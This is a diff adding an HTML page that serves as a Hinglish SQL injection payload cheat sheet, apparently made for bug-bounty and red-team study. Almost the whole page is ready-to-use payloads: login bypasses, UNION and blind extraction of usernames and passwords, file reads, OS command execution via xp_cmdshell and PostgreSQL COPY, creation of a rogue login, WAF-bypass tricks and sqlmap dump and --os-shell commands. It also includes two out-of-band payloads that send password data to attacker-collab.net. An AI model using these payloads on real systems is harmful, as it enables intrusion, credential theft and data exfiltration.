@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<title>SQL Injection — Query Table Reference</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#30363d;
+    --text:#c9d1d9; --muted:#8b949e;
+    --blue:#58a6ff; --green:#3fb950; --orange:#f0883e;
+    --red:#f85149; --purple:#bc8cff; --yellow:#e3b341;
+  }
+  *{box-sizing:border-box;}
+  body{background:var(--bg); color:var(--text); font-family:'Segoe UI',Arial,sans-serif; margin:0; padding:0;}
+  header{background:linear-gradient(135deg,#1f2937,#111827); padding:35px 30px; border-bottom:3px solid var(--purple); text-align:center;}
+  header h1{color:var(--purple); font-size:2em; margin:0;}
+  header p{color:var(--muted); margin-top:6px;}
+  .container{max-width:1100px; margin:0 auto; padding:25px 20px;}
+  .toc{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:16px 22px; margin-bottom:25px;}
+  .toc a{color:var(--blue); text-decoration:none; margin-right:18px; font-size:0.9em; display:inline-block; padding:3px 0;}
+  section{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:20px 25px; margin-bottom:22px;}
+  section h2{color:var(--orange); border-bottom:2px solid var(--border); padding-bottom:8px; font-size:1.3em; margin-top:0;}
+  table{width:100%; border-collapse:collapse; margin-top:10px;}
+  th, td{border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top;}
+  th{background:#1c2333; color:var(--yellow); font-size:0.85em;}
+  tr:nth-child(even){background:#141a24;}
+  td.q{font-family:'Consolas','Courier New',monospace; color:var(--green); font-size:0.88em; white-space:pre-wrap;}
+  td.note{font-size:0.85em; color:var(--text);}
+  td.db{font-size:0.75em; color:var(--purple); font-weight:bold;}
+  footer{text-align:center; color:var(--muted); padding:25px; font-size:0.85em;}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🗂️ SQL Injection — Query Table Reference</h1>
+  <p>Sirf codes + ek-line purpose. Minimum theory, maximum payloads.</p>
+</header>
+
+<div class="container">
+
+  <div class="toc">
+    <a href="#authbypass">Auth Bypass</a>
+    <a href="#union">UNION-Based</a>
+    <a href="#error">Error-Based</a>
+    <a href="#blind">Blind (Boolean/Time)</a>
+    <a href="#stacked">Stacked/OOB</a>
+    <a href="#enum">Enumeration</a>
+    <a href="#advanced">Advanced/WAF-Bypass</a>
+    <a href="#sqlmap">sqlmap Commands</a>
+  </div>
+
+  <section id="authbypass">
+    <h2>1. Auth Bypass Queries</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">' OR '1'='1</td><td class="db">All</td><td class="note">WHERE condition ko hamesha TRUE bana deta hai — login bypass</td></tr>
+      <tr><td class="q">' OR 1=1--+</td><td class="db">All</td><td class="note">Baaki query comment kar deta hai, condition TRUE</td></tr>
+      <tr><td class="q">admin'--</td><td class="db">All</td><td class="note">Password check hi comment kar deta hai, sirf username match hota hai</td></tr>
+      <tr><td class="q">admin' #</td><td class="db">MySQL</td><td class="note">Same as above, MySQL comment style</td></tr>
+      <tr><td class="q">' OR 1=1 LIMIT 1--+</td><td class="db">MySQL</td><td class="note">Sirf ek row return karta hai (multiple-row error avoid)</td></tr>
+      <tr><td class="q">') OR ('1'='1</td><td class="db">All</td><td class="note">Jab query parentheses ke andar wrapped ho</td></tr>
+      <tr><td class="q">' OR ''='</td><td class="db">All</td><td class="note">Empty string comparison trick</td></tr>
+      <tr><td class="q">' OR 1=1#</td><td class="db">MySQL</td><td class="note">Hash comment se auth bypass</td></tr>
+      <tr><td class="q">1' OR '1'='1' LIMIT 1 -- -</td><td class="db">MySQL</td><td class="note">Trailing dash space se comment terminate</td></tr>
+      <tr><td class="q">'||'1'='1</td><td class="db">Oracle</td><td class="note">Oracle concatenation operator abuse</td></tr>
+    </table>
+  </section>
+
+  <section id="union">
+    <h2>2. UNION-Based Queries</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">' ORDER BY 1--+</td><td class="db">All</td><td class="note">Column count check — increment karo jab tak error na aaye</td></tr>
+      <tr><td class="q">' UNION SELECT NULL,NULL,NULL--+</td><td class="db">All</td><td class="note">UNION accept ho raha hai confirm karta hai (column count match)</td></tr>
+      <tr><td class="q">' UNION SELECT 1,2,3--+</td><td class="db">All</td><td class="note">Reflecting column dhundta hai (kaunsa number page pe dikhta hai)</td></tr>
+      <tr><td class="q">' UNION SELECT database(),user(),version()--+</td><td class="db">MySQL</td><td class="note">Current DB name, user, version nikalta hai</td></tr>
+      <tr><td class="q">' UNION SELECT @@version,2,3--+</td><td class="db">MSSQL/MySQL</td><td class="note">DB version nikalta hai</td></tr>
+      <tr><td class="q">' UNION SELECT table_name,2,3 FROM information_schema.tables--+</td><td class="db">MySQL/MSSQL</td><td class="note">Sabhi table names list karta hai</td></tr>
+      <tr><td class="q">' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--+</td><td class="db">MySQL/MSSQL</td><td class="note">'users' table ke sab columns nikalta hai</td></tr>
+      <tr><td class="q">' UNION SELECT username,password,3 FROM users--+</td><td class="db">All</td><td class="note">Direct credentials extract karta hai</td></tr>
+      <tr><td class="q">' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x3c62723e),2,3 FROM users--+</td><td class="db">MySQL</td><td class="note">Sabhi rows ek response mein combine karta hai</td></tr>
+      <tr><td class="q">' UNION SELECT CONCAT(username,'::',password) FROM users--+</td><td class="db">MySQL</td><td class="note">Jab sirf 1 column reflect ho raha ho</td></tr>
+      <tr><td class="q">' UNION SELECT banner,NULL FROM v$version--+</td><td class="db">Oracle</td><td class="note">Oracle version banner nikalta hai (dual table ke bina bhi chalta hai yaha)</td></tr>
+      <tr><td class="q">' UNION SELECT table_name,NULL FROM all_tables--+</td><td class="db">Oracle</td><td class="note">Oracle mein table list</td></tr>
+      <tr><td class="q">' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--+</td><td class="db">MySQL</td><td class="note">Server file read karta hai (FILE privilege chahiye)</td></tr>
+    </table>
+  </section>
+
+  <section id="error">
+    <h2>3. Error-Based Queries</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">' AND extractvalue(1,concat(0x7e,database()))--+</td><td class="db">MySQL</td><td class="note">XPath error abuse karke DB name error message mein leak karta hai</td></tr>
+      <tr><td class="q">' AND updatexml(1,concat(0x7e,version()),1)--+</td><td class="db">MySQL</td><td class="note">Same technique, version leak karta hai</td></tr>
+      <tr><td class="q">' AND 1=CONVERT(int,(SELECT @@version))--+</td><td class="db">MSSQL</td><td class="note">Type conversion error se version leak</td></tr>
+      <tr><td class="q">' AND 1=CAST((SELECT version()) AS int)--+</td><td class="db">PostgreSQL</td><td class="note">Cast error se version leak</td></tr>
+      <tr><td class="q">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+</td><td class="db">MySQL</td><td class="note">Double query duplicate-key error se data leak (older MySQL)</td></tr>
+      <tr><td class="q">' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--+</td><td class="db">Oracle</td><td class="note">Oracle-specific error function abuse</td></tr>
+    </table>
+  </section>
+
+  <section id="blind">
+    <h2>4. Blind SQLi — Boolean &amp; Time</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">' AND 1=1--+</td><td class="db">All</td><td class="note">TRUE baseline — normal page aana chahiye</td></tr>
+      <tr><td class="q">' AND 1=2--+</td><td class="db">All</td><td class="note">FALSE baseline — page different/empty aana chahiye</td></tr>
+      <tr><td class="q">' AND SUBSTRING(database(),1,1)='a'--+</td><td class="db">MySQL</td><td class="note">DB name ka pehla character guess karta hai</td></tr>
+      <tr><td class="q">' AND ASCII(SUBSTRING(database(),1,1))>77--+</td><td class="db">MySQL</td><td class="note">Binary search se character fast extract karta hai</td></tr>
+      <tr><td class="q">' AND (SELECT COUNT(*) FROM users)>0--+</td><td class="db">All</td><td class="note">Table exist karti hai ya nahi check karta hai</td></tr>
+      <tr><td class="q">' AND SLEEP(5)--+</td><td class="db">MySQL</td><td class="note">5 second delay — time-based confirm</td></tr>
+      <tr><td class="q">'; WAITFOR DELAY '0:0:5'--+</td><td class="db">MSSQL</td><td class="note">5 second delay MSSQL mein</td></tr>
+      <tr><td class="q">' AND pg_sleep(5)--+</td><td class="db">PostgreSQL</td><td class="note">5 second delay PostgreSQL mein</td></tr>
+      <tr><td class="q">' AND dbms_lock.sleep(5)=1--+</td><td class="db">Oracle</td><td class="note">5 second delay Oracle mein</td></tr>
+      <tr><td class="q">' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--+</td><td class="db">MySQL</td><td class="note">Conditional delay — data extraction ke liye</td></tr>
+      <tr><td class="q">' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(5),0)--+</td><td class="db">MySQL</td><td class="note">Binary search + time-based combo</td></tr>
+    </table>
+  </section>
+
+  <section id="stacked">
+    <h2>5. Stacked Queries &amp; Out-of-Band</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">1'; SELECT 1--+</td><td class="db">MSSQL/PostgreSQL</td><td class="note">Stacked queries support confirm karta hai</td></tr>
+      <tr><td class="q">'; EXEC xp_cmdshell('whoami')--+</td><td class="db">MSSQL</td><td class="note">OS command execute karta hai (agar enabled ho)</td></tr>
+      <tr><td class="q">'; EXEC sp_addlogin 'hacker','Pass123'--+</td><td class="db">MSSQL</td><td class="note">Naya DB login create karta hai (PoC only)</td></tr>
+      <tr><td class="q">'; COPY (SELECT '') TO PROGRAM 'id'--+</td><td class="db">PostgreSQL</td><td class="note">OS command execute karta hai (superuser required)</td></tr>
+      <tr><td class="q">'; DECLARE @data VARCHAR(1024); SELECT @data=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker-collab.net\\a"')--+</td><td class="db">MSSQL</td><td class="note">DNS exfiltration se data attacker server pe bhejta hai</td></tr>
+      <tr><td class="q">' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE rownum=1)||'.attacker-collab.net') FROM dual--+</td><td class="db">Oracle</td><td class="note">HTTP request se OOB data exfiltration</td></tr>
+    </table>
+  </section>
+
+  <section id="enum">
+    <h2>6. Schema Enumeration Queries</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">' UNION SELECT schema_name,2,3 FROM information_schema.schemata--+</td><td class="db">MySQL</td><td class="note">Sabhi databases list karta hai</td></tr>
+      <tr><td class="q">' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--+</td><td class="db">MySQL</td><td class="note">Current DB ke sabhi tables ek response mein</td></tr>
+      <tr><td class="q">' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 0--+</td><td class="db">MySQL</td><td class="note">Row-by-row extraction (jab GROUP_CONCAT truncate ho)</td></tr>
+      <tr><td class="q">' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--+</td><td class="db">PostgreSQL</td><td class="note">PostgreSQL mein public schema ke tables</td></tr>
+      <tr><td class="q">' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--+</td><td class="db">Oracle</td><td class="note">Oracle mein columns list (table name UPPERCASE hona chahiye)</td></tr>
+    </table>
+  </section>
+
+  <section id="advanced">
+    <h2>7. Advanced / WAF Bypass Queries</h2>
+    <table>
+      <tr><th width="35%">Query</th><th width="10%">DB</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">UNI/**/ON SEL/**/ECT NULL,NULL--+</td><td class="db">MySQL</td><td class="note">Keyword filter bypass — comment se keyword split</td></tr>
+      <tr><td class="q">UnIoN sElEcT NULL,NULL--+</td><td class="db">All</td><td class="note">Case-mixing se blacklist filter bypass</td></tr>
+      <tr><td class="q">' UNION SELECT 0x61646d696e,2,3--+</td><td class="db">MySQL</td><td class="note">Hex encoding se quote-filter bypass ('admin' = 0x61646d696e)</td></tr>
+      <tr><td class="q">'/**/OR/**/1=1--+</td><td class="db">All</td><td class="note">Space-filter bypass comments se</td></tr>
+      <tr><td class="q">' OR 1=1%0a--+</td><td class="db">All</td><td class="note">Newline character se space bypass</td></tr>
+      <tr><td class="q">' AND 1=1&&1=1--+</td><td class="db">MySQL</td><td class="note">AND/OR filtered hone par && || use karo</td></tr>
+      <tr><td class="q">' ORDER BY 100--+</td><td class="db">All</td><td class="note">Single-shot high number test, error se max columns pata chalta hai</td></tr>
+      <tr><td class="q">' GROUP BY 10--+</td><td class="db">MySQL</td><td class="note">Group by error se column count reveal ho sakta hai</td></tr>
+      <tr><td class="q">%2527 (double URL encoded quote)</td><td class="db">All</td><td class="note">Kuch WAFs single-decode karte hain, double-encoding bypass kar sakta hai</td></tr>
+    </table>
+  </section>
+
+  <section id="sqlmap">
+    <h2>8. sqlmap Commands</h2>
+    <table>
+      <tr><th width="40%">Command</th><th>Kya karta hai</th></tr>
+      <tr><td class="q">sqlmap -u "https://target.com/page?id=1" --batch</td><td class="note">Auto-detect scan, sab questions default se answer</td></tr>
+      <tr><td class="q">sqlmap -u "..." --technique=U --batch</td><td class="note">Sirf UNION technique force karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." --technique=B --batch</td><td class="note">Sirf Boolean-blind technique force karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." --technique=T --batch</td><td class="note">Sirf Time-blind technique force karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." --dbs</td><td class="note">Sabhi databases list karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." -D dbname --tables</td><td class="note">Specific DB ke tables list karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." -D dbname -T users -C username,password --dump</td><td class="note">Specific columns dump karta hai</td></tr>
+      <tr><td class="q">sqlmap -r request.txt --batch</td><td class="note">Burp se saved raw request file use karke scan karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." --cookie="session=abc*" --batch</td><td class="note">Cookie parameter mein injection test karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." --tamper=space2comment,charencode --random-agent</td><td class="note">WAF bypass tamper scripts use karta hai</td></tr>
+      <tr><td class="q">sqlmap -u "..." --os-shell</td><td class="note">OS shell try karta hai (stacked queries + privileges chahiye)</td></tr>
+      <tr><td class="q">sqlmap -u "..." --level=5 --risk=3</td><td class="note">Deeper aur zyada aggressive testing (zyada payloads try karta hai)</td></tr>
+    </table>
+  </section>
+
+</div>
+
+<footer>
+  Made for Karan's Bug Bounty → Red Team journey | Har cheez mein poochho — Yeh kaise toot sakta hai?
+</footer>
+
+</body>
+</html>
